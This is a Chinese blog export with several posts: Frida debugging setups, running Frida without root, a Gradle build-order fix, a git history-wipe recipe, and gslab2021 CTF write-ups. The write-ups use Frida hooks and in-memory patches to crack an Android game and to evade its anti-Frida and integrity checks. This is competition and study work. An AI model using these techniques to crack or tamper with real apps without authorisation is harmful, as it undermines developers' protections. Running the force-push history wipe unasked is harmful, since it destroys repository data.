    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://blog.xhyeax.com/2021/11/20/frida-script-debug-env-setup-vscode-devtools/">前文</a>使用的是<code>VSCode</code>和<code>DevTools</code>，需要在两个应用间切换，且需要查找最终位置再下断点，比较麻烦。</p>
<p>于是搭建<code>PyCharm</code>调试环境，可直接在源文件（ts和js）下断点</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：<code>Windows 10 20H2 x64</code><br>软件：<code>PyCharm Professional 2021.2.3</code>、<code>Node.js 14.17.4</code>、<code>Frida 15.1.11</code></p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="克隆仓库并安装"><a href="#克隆仓库并安装" class="headerlink" title="克隆仓库并安装"></a>克隆仓库并安装</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/XhyEax/frida-script-agent</span><br><span class="line"><span class="built_in">cd</span> frida-script-agent/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>使用<code>PyCharm</code>打开该目录</p>
<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>按<code>Ctrl+Alt+S</code>打开插件页面，搜索并安装 <code>Node.js</code> 插件</p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>编辑<code>index.ts</code>，可使用<code>import</code>引入其他模块</p>
<h3 id="开启实时编译（推荐）"><a href="#开启实时编译（推荐）" class="headerlink" title="开启实时编译（推荐）"></a>开启实时编译（推荐）</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run watch</span><br></pre></td></tr></table></figure>
<p>监听文件变化，自动编译到<code>_agent.js</code></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h3 id="启动Server"><a href="#启动Server" class="headerlink" title="启动Server"></a>启动Server</h3><p>注意：运行前确保已开启实时编译，不然修改不生效</p>
<h4 id="方法一-npm-scripts（推荐）"><a href="#方法一-npm-scripts（推荐）" class="headerlink" title="方法一 npm scripts（推荐）"></a>方法一 npm scripts（推荐）</h4><h5 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run spawn --pkgname=com.android.settings</span><br></pre></td></tr></table></figure>
<h5 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run attach --appname=设置</span><br></pre></td></tr></table></figure>

<p>也可添加为<code>PyCharm</code>启动配置，指定<code>Arguments</code></p>
<h4 id="方法二-命令行"><a href="#方法二-命令行" class="headerlink" title="方法二 命令行"></a>方法二 命令行</h4><p>添加<code>--debug --runtime=v8</code>启动参数，附加到app</p>
<p>成功后会在<code>Frida CLI</code>中输出：<code>Chrome Inspector server listening on port 9229</code></p>
<h3 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h3><p>添加调试器配置<code>Attaching to Node.js/Chrome</code>，配置默认即可，可勾选自动重连</p>
<p>PS：旧版本<code>Frida</code>可能需要选择<code>Node.js &lt; 8 started with --debug</code></p>
<h3 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h3><p>运行新增的调试器配置，连接成功后，可以在<code>Scripts</code>看到相应的脚本文件</p>
<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>在<strong>源文件</strong>下断点调试即可，主动调用同前文，使用<code>rpc.exports</code>导出函数</p>
<p>注意：如果js脚本并未使用<code>frida-compile</code>编译成目标文件，则需要使用<code>DevTools</code>调试，无法使用<code>PyCharm</code>。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Frida</tag>
        <tag>PyCharm</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida在无Root机器上的使用方案 (基于VirtualApp)</title>
    <url>/2021/08/06/frida-no-root/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>大多数国产手机厂商出于安全考虑，禁止用户解锁BootLoader，因此也就无法通过Magisk获取Root权限。<br>本文基于<a href="https://github.com/asLody/VirtualApp">VirtualApp框架</a>及<a href="https://github.com/frida/frida">Frida-Gadget</a>，实现不修改apk使用Frida。</p>
<span id="more"></span>
<h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><h3 id="修改框架源码"><a href="#修改框架源码" class="headerlink" title="修改框架源码"></a>修改框架源码</h3><p>阅读<code>VirtualApp</code>源码可知，在<a href="https://github.com/asLody/VirtualApp/blob/bd6f03cfd7cbf3ad63ec6198777a102c18112c2d/VirtualApp/lib/src/main/jni/Foundation/IOUniformer.cpp"><code>lib/src/main/jni/Foundation/IOUniformer.cpp</code></a>中hook了<code>dlopen</code>，并实现了<code>onSoLoaded</code>函数，可在该函数中通过传入的<code>filename</code>获取加载的动态库路径。</p>
<p>由此，可以在<code>libart.so</code>加载后，手动调用<code>dlopen</code>加载<code>Frida-Gadget</code></p>
<p>具体操作为：</p>
<p>将arm版本的so文件及配置文件添加到<code>lib\src\main\jniLibs\armeabi-v7a</code>，并配置<code>build.gradle</code>的<code>android.defaultConfig</code>中的<code>ndk.abiFilters</code></p>
<h3 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h3><p>除了修改源码，也可以自己编写一个Xposed模块，实现<code>Frida-Gadget</code>的加载。</p>
<p>hook <code>ContextWrapper.attachBaseContext</code>函数，在其执行后，调用<code>System.load</code>或<code>System.loadLibrary</code>加载<code>Frida-Gadget</code>。</p>
<p>注意：如果hook系统应用（<code>PLATFORM_APP</code>），且未关闭<code>SELinux</code>，则无法从<code>data</code>目录下加载so文件。</p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>使用油猴脚本自动加载JQuery</title>
    <url>/2021/12/06/auto-load-jquery-by-tampermonkey/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>如题，使用油猴脚本实现<code>JQuery</code>自动加载。</p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><a href="https://github.com/XhyEax/JQueryAutoLoad">XhyEax/JQueryAutoLoad</a></p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="被重写"><a href="#被重写" class="headerlink" title="$被重写"></a>$被重写</h3><p>网站重写了<code>$</code>，直接加载<code>JQuery</code>的话会发生覆盖，部分组件可能无法正常使用。（例如<a href="https://www.52pojie.cn/">吾爱破解</a>）</p>
<h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><p>只判断<code>$</code>，存在则不覆盖</p>
<p>PS：似乎js也有命名空间的概念？之后有空再看看</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/dolin88/article/details/80043504">区别 (function($){…})(jQuery)、$(function(){ })和$.fn</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida js调试环境搭建（VSCode + DevTools）</title>
    <url>/2021/11/20/frida-script-debug-env-setup-vscode-devtools/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Why：兼容<code>JavaScript</code>、语法提示、调试功能</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：<code>Windows 10 20H2 x64</code><br>软件：<code>VS Code</code>、<code>Chrome Stable 96.0.4664.45</code>、<code>Node.js 14.17.4</code>、<code>Frida 15.1.11</code></p>
<span id="more"></span>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="克隆仓库并安装"><a href="#克隆仓库并安装" class="headerlink" title="克隆仓库并安装"></a>克隆仓库并安装</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/XhyEax/frida-agent-example</span><br><span class="line"><span class="built_in">cd</span> frida-agent-example/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>编辑<code>index.ts</code>，可使用<code>import</code>引入其他模块</p>
<p>注意：日志都是在<code>Frida CLI</code>中输出，可通过<code>-o</code>参数指定日志文件</p>
<h3 id="开启实时编译（推荐）"><a href="#开启实时编译（推荐）" class="headerlink" title="开启实时编译（推荐）"></a>开启实时编译（推荐）</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run watch</span><br></pre></td></tr></table></figure>
<p>监听文件变化，自动编译到<code>_agent.js</code></p>
<h3 id="代码提示"><a href="#代码提示" class="headerlink" title="代码提示"></a>代码提示</h3><p><code>VSCode</code>安装<code>Node.js</code>和<code>TypeScript</code>相关拓展即可</p>
<p>PS：在<code>frida-script-agent</code>目录下直接创建js文件，也有代码提示</p>
<h2 id="更新"><a href="#更新" class="headerlink" title="*更新"></a>*<strong>更新</strong></h2><p>建议使用<code>PyCharm</code>，可直接在源文件下断点，见<a href="https://blog.xhyeax.com/2021/11/21/frida-script-debug-env-setup-pycharm/">Frida ts环境搭建（PyCharm）</a></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="启动Server"><a href="#启动Server" class="headerlink" title="启动Server"></a>启动Server</h3><p>注意：运行前确保已开启实时编译，不然修改不生效</p>
<p>使用<code>spawn</code>或<code>attach</code>模式附加app，设置引擎为<code>v8</code>并开启调试模式。</p>
<h4 id="方法一-使用npm-scripts（推荐）"><a href="#方法一-使用npm-scripts（推荐）" class="headerlink" title="方法一 使用npm scripts（推荐）"></a>方法一 使用npm scripts（推荐）</h4><h5 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run spawn --pkgname=com.android.settings</span><br></pre></td></tr></table></figure>
<h5 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run attach --appname=设置</span><br></pre></td></tr></table></figure>

<p>也可将上述命令添加到<code>VSCode</code>启动配置</p>
<h4 id="方法二-命令行"><a href="#方法二-命令行" class="headerlink" title="方法二 命令行"></a>方法二 命令行</h4><h5 id="spawn-1"><a href="#spawn-1" class="headerlink" title="spawn"></a>spawn</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">frida -U --debug --runtime=v8 -l _agent.js -o out.log --no-pause -f pkgname</span><br></pre></td></tr></table></figure>
<h5 id="attach-1"><a href="#attach-1" class="headerlink" title="attach"></a>attach</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">frida -U --debug --runtime=v8 -l _agent.js -o out.log appname</span><br></pre></td></tr></table></figure>

<p>成功后会在<code>Frida CLI</code>中输出：<code>Chrome Inspector server listening on port 9229</code></p>
<h3 id="DevTools附加"><a href="#DevTools附加" class="headerlink" title="DevTools附加"></a>DevTools附加</h3><p>使用谷歌内核浏览器，按下<code>F12</code>打开<code>DevTools</code>，点击左上角的<code>Node.js</code>图标（或打开<code>chrome://inspect</code>，点击<code>Open dedicated DevTools for Node</code>）</p>
<p>然后按下<code>Ctrl + P</code>，切换源文件。（或点击<code>来源</code>-<code>节点</code>，打开<code>Node.js</code>下的文件）</p>
<p>PS：按<code>Esc</code>可切换抽屉栏控制台的显示</p>
<p>（也可以使用<code>VSCode</code>附加，但是无法下断点，控制台有时也连接不上。不推荐）</p>
<h3 id="主动调用方法"><a href="#主动调用方法" class="headerlink" title="主动调用方法"></a>主动调用方法</h3><h4 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h4><p>如果是使用<code>frida-compile</code>生成的js文件，则需要使用<code>rpc.exports</code>将方法导出，然后通过<code>rpc.exports.方法名</code>调用（附加调试的控制台和<code>Frida CLI</code>均可）</p>
<h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p>如果使用原始的js脚本，只需要加上<code>--debug --runtime=v8</code>参数启动，在<code>DevTools</code>和<code>Frida CLI</code>中都可以直接通过函数名调用（默认导出）</p>
<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>打开<code>DevTools</code>，在<strong>最终文件</strong>（如<code>_agent.js</code>）下断点即可，可配合主动调用触发断点</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-265160.htm">FRIDA 使用经验交流分享-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Frida</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Gradle app模块构建顺序探究</title>
    <url>/2021/09/01/gradle-module-build-order-error/</url>
    <content><![CDATA[<h2 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h2><p>使用<code>Gradle</code>构建安卓项目，第一次构建时报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Task :app:buildCMakeDebug FAILED</span><br><span class="line">C/C++: ninja: error: missing and no known rule to make it</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="查看项目依赖"><a href="#查看项目依赖" class="headerlink" title="查看项目依赖"></a>查看项目依赖</h2><p><code>app</code>模块和<code>inject</code>模块都位于父项目下，在文件夹上属于平行关系。<br>在<code>Project Structure</code>中查看，<code>app</code>依赖于<code>inject</code>（在<code>build.gradle</code>中设置为依赖）。<br>理应先执行<code>inject:buildCMakeDebug</code>再执行<code>app:buildCMakeDebug</code></p>
<h2 id="查看构建顺序"><a href="#查看构建顺序" class="headerlink" title="查看构建顺序"></a>查看构建顺序</h2><p>点击下方<code>Build</code>-<code>Build Output</code>查看顺序，发现<code>app</code>模块先于<code>inject</code>模块构建。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="重命名项目"><a href="#重命名项目" class="headerlink" title="重命名项目"></a>重命名项目</h3><p>将<code>app</code>模块重命名为<code>victim_app</code>后，构建顺序正常。<br>具体操作：<br><code>Clean Project</code>后，删除模块内的<code>.cxx</code>文件夹（方便重命名）。<br>重命名<code>app</code>模块为<code>victim_app</code>，并修改<code>setting.gradle</code>及依赖，使其保持一致。<br>最后<code>Sync with Gradle Files</code>，<code>Rebuild Project</code>。</p>
<h3 id="手动按顺序构建"><a href="#手动按顺序构建" class="headerlink" title="手动按顺序构建"></a>手动按顺序构建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gradlew inject:build</span><br><span class="line">gradlew app:build</span><br></pre></td></tr></table></figure>


<h2 id="推论"><a href="#推论" class="headerlink" title="推论"></a>推论</h2><p>在<code>Gradle</code>执行<code>Tasks</code>时，<code>app</code>模块比<code>inject</code>模块具有更高优先级，导致不按照依赖顺序构建。</p>
<p>推测<code>Gradle</code>会对<code>setting.gradle</code>中的模块按字典序排序，然后构建。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>将<code>inject</code>模块名改为<code>abc</code>，修改依赖项目名，<code>Rebuild Project</code>，发现构建顺序正常。</p>
<p>将<code>inject</code>改为<code>bcd</code>，出现同样错误，说明确实是按字典序构建。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p>However, ./gradlew run will run applications in lexicographical order. Instead, explicitly specify which subproject to run</p>
</blockquote>
<p><a href="https://github.com/kissaten/gradle-multi-project-example">gradle-multi-project-example</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>git删除历史Commit</title>
    <url>/2018/11/30/git-clean/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>把库克隆到本地后，创建新分支，删除原master分支后，将临时分支更名<br>在库目录下执行以下代码</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout --orphan tmp</span><br><span class="line">git add -A</span><br><span class="line">git commit -m <span class="string">&quot;clean project&quot;</span></span><br><span class="line">git branch -D master</span><br><span class="line">git branch -m master</span><br><span class="line">git push -f origin master</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/dounine/article/details/77840416">Gitlab删除历史commit清理空间</a></p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>gslab2021 决赛 - 安卓客户端安全</title>
    <url>/2021/04/10/gslab2021-final-android/</url>
    <content><![CDATA[<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>使用frida实现功能破解，未完全绕过完整性检测，猜测解密so文件时有校验</p>
<h3 id="app分析"><a href="#app分析" class="headerlink" title="app分析"></a>app分析</h3><h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p>游戏引擎为<code>il2cpp</code>，<code>libil2cpp.so</code>代码段加密，<code>global-metadata.dat</code>和<code>filelist</code>被加密。</p>
<span id="more"></span>
<h4 id="逆向分析过程"><a href="#逆向分析过程" class="headerlink" title="逆向分析过程"></a>逆向分析过程</h4><h5 id="获取global-metadata-dat"><a href="#获取global-metadata-dat" class="headerlink" title="获取global-metadata.dat"></a>获取global-metadata.dat</h5><p>使用frida，从内存中dump并修复<code>libil2cpp.so</code>。然后使用IDA打开，搜索字符串<code>global-metadata.dat</code>，定位到<code>MetadataCache__Initialize</code>（偏移值<code>5580FC</code>），<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-final-1.png"></p>
<p>由此获取到<code>s_GlobalMetadata</code>偏移值为<code>760E90</code>，hook该函数，dump出解密后的<code>global-metadata.dat</code>（需修复文件头）<br>（之后没用上这个）</p>
<h5 id="参考正向编程的逻辑"><a href="#参考正向编程的逻辑" class="headerlink" title="参考正向编程的逻辑"></a>参考正向编程的逻辑</h5><p>参考<a href="https://github.com/dgkanatsios/FlappyBirdStyleGame">FlappyBirdStyleGame</a>代码，得知碰撞检测函数为<code>OnTriggerEnter2D</code>（水管）和<code>OnCollisionEnter2D</code>（地面）</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnTriggerEnter2D</span>(<span class="params">Collider2D col</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (GameStateManager.GameState == GameState.Playing)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (col.gameObject.tag == <span class="string">&quot;Pipeblank&quot;</span>) <span class="comment">//pipeblank is an empty gameobject with a collider between the two pipes</span></span><br><span class="line">        &#123;</span><br><span class="line">            GetComponent&lt;AudioSource&gt;().PlayOneShot(ScoredAudioClip);</span><br><span class="line">            ScoreManagerScript.Score++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (col.gameObject.tag == <span class="string">&quot;Pipe&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            FlappyDies();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnCollisionEnter2D</span>(<span class="params">Collision2D col</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (GameStateManager.GameState == GameState.Playing)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (col.gameObject.tag == <span class="string">&quot;Floor&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            FlappyDies();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以之后重点关注<code>OnTriggerEnter2D</code>函数</p>
<h5 id="hook-il2cpp-runtime-invoke"><a href="#hook-il2cpp-runtime-invoke" class="headerlink" title="hook il2cpp_runtime_invoke"></a>hook il2cpp_runtime_invoke</h5><p>由于该app会检测frida默认端口，故需要修改监听端口（如 1234）启动frida服务端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell su -c &quot;/data/fs -l 0.0.0.0:1234 &amp;&quot;</span><br></pre></td></tr></table></figure>
<p>转发端口并spawn模式启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line">frida-ps -H 127.0.0.1:1234</span><br><span class="line">frida -H 127.0.0.1:1234 -f com.personal.flappybird -l script.js --no-pause</span><br></pre></td></tr></table></figure>

<p>使用frida hook <code>libil2cpp.so</code> 的 <code>il2cpp_runtime_invoke</code>函数，打印被调用的函数地址及函数名。<br>由于该函数被魔改，所以需要对比il2cpp源码（位于<code>..\Unity\Editor\Data\il2cpp\libil2cpp</code>），同时使用Unity手动编译一份apk，反编译进行参考对比（笔者编译的是同类游戏<a href="https://github.com/dgkanatsios/FlappyBirdStyleGame">FlappyBirdStyleGame</a>）</p>
<p>该函数参数为<code>(const MethodInfo * method, void *obj, void **params, Il2CppException **exc)</code></p>
<p>其中method包含函数名及函数地址，所以只需要通过多级指针+偏移的方式，即可找到命名空间、类名、函数名及函数地址</p>
<p>直接hook，打印输出为空，可知偏移值被修改了。通过对比正常编译的 libil2cpp.so（并穷举偏移），找到正确的偏移值，frida脚本如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump_class</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> off = <span class="number">48</span></span><br><span class="line">    <span class="keyword">var</span> namespaze = ptr(p).readPointer().readPointer().readCString()</span><br><span class="line">    <span class="keyword">var</span> s = ptr(p).add(off).readPointer().readCString()</span><br><span class="line">    <span class="keyword">return</span> namespaze + <span class="string">&quot; &quot;</span> + (s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump_method</span>(<span class="params">p, soAddr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> off = <span class="number">24</span></span><br><span class="line">    <span class="keyword">var</span> name = ptr(p).add(off).readPointer().readCString()</span><br><span class="line">    <span class="keyword">var</span> k = dump_class(ptr(p).add(off + <span class="number">4</span>).readPointer());</span><br><span class="line">    <span class="keyword">var</span> method_ptr = ptr(p).add(<span class="number">40</span>).readPointer().sub(soAddr)</span><br><span class="line">    <span class="keyword">return</span> k + <span class="string">&quot;.&quot;</span> + name + <span class="string">&quot; &quot;</span> + method_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_il2cpp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libil2cpp.so&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(libbase);</span><br><span class="line"></span><br><span class="line">    addr = Module.findExportByName(<span class="string">&quot;libil2cpp.so&quot;</span>, <span class="string">&quot;il2cpp_runtime_invoke&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> il2cpp_runtime_invoke = <span class="keyword">new</span> NativeFunction(addr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">mtd, obj, params, exec</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="number">0x0</span> &amp;&amp; obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> method = dump_method(mtd, libbase);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (method.indexOf(<span class="string">&quot;Assembly-CSharp&quot;</span>) != -<span class="number">1</span> &amp;&amp; method.indexOf(<span class="string">&quot;Update&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;il2cpp_runtime_invoke() called!&quot;</span>, method);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//不调用该函数</span></span><br><span class="line">            <span class="keyword">if</span> (method.indexOf(<span class="string">&quot;PlayerController.OnTriggerEnter2D&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> paramobj = params.readPointer();</span><br><span class="line">                <span class="keyword">var</span> klass = params.readPointer().readPointer()</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;il2cpp_runtime_invoke() called!&quot;</span>, mtd, obj, params, paramobj, klass);</span><br><span class="line">                <span class="built_in">console</span>.log(method, dump_class(klass));</span><br><span class="line">                <span class="comment">// return 0</span></span><br><span class="line">                <span class="keyword">return</span> ptr(<span class="number">0x0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> il2cpp_runtime_invoke(mtd, obj, params, exec);</span><br><span class="line">    &#125;, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="打印被调用函数"><a href="#打印被调用函数" class="headerlink" title="打印被调用函数"></a>打印被调用函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">il2cpp_runtime_invoke() called! Assembly-CSharp.dll PlayerController.OnTriggerEnter2D 0x540d04</span><br><span class="line">il2cpp_runtime_invoke() called! Assembly-CSharp.dll ObstacleSpawner.OnTriggerEnter2D 0x5403b0</span><br></pre></td></tr></table></figure>
<p>显然<code>PlayerController.OnTriggerEnter2D</code>就是我们要找的函数，由此可得到偏移值<code>0x540d04</code></p>
<h5 id="查看-libil2cpp-so"><a href="#查看-libil2cpp-so" class="headerlink" title="查看 libil2cpp.so"></a>查看 libil2cpp.so</h5><p>从内存中dump libil2cpp.so并修复，使用IDA打开。<br>由于之前已使用frida定位到函数地址<code>0x540d04</code>，跳转到此函数，按F5分析。</p>
<p>可找到判断障碍物的关键位置（找到之后发现可以通过getGameObject、getTag、GameObject_CompareTag等函数，查看交叉引用定位到此处）：</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-final-2.png"></p>
<p>等libil2cpp.so解密后，动态patch此处即可<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-final-3.png"></p>
<p>使用frida验证，发现可以实现功能</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_il2cpp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libil2cpp.so&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(libbase);</span><br><span class="line">    <span class="keyword">var</span> addr = libbase.add(<span class="number">0x540e60</span>);</span><br><span class="line">    <span class="keyword">var</span> barr = [<span class="number">0xe2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xea</span>];</span><br><span class="line">    Memory.protect(addr, <span class="number">0x4</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">    Memory.writeByteArray(addr, barr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="去检测（未完成）"><a href="#去检测（未完成）" class="headerlink" title="去检测（未完成）"></a>去检测（未完成）</h4><p>使用堆栈回溯法逐一去除检测（即每当app崩溃，就使用日志查看堆栈，修改<code>libsec2021.so</code>的相应位置）<br>结果还是未完全绕过，猜测解密so文件时有校验</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>gslab2021 初赛 - 安卓客户端安全</title>
    <url>/2021/04/04/gslab2021-pre-android/</url>
    <content><![CDATA[<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>成功实现RocketMouse直装破解版</p>
<h3 id="app分析"><a href="#app分析" class="headerlink" title="app分析"></a>app分析</h3><h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p>首先查看apk文件结构，发现是<code>mono</code>引擎的unity3d游戏，且<code>Assembly-CSharp.dll</code>已加密。<br>并且存在<code>assets/filelist</code>文件，测试发现是apk中各个文件的crc32校验值。</p>
<span id="more"></span>
<h4 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h4><p>使用frida的spawn模式启动app，弹出对话框，点击对话框会退出进程，于是使用jeb打开该apk文件。<br>发现<code>com.tencent.games.sec2021.Sec2021MsgBox</code>的<code>onDismiss</code>函数存在退出代码。</p>
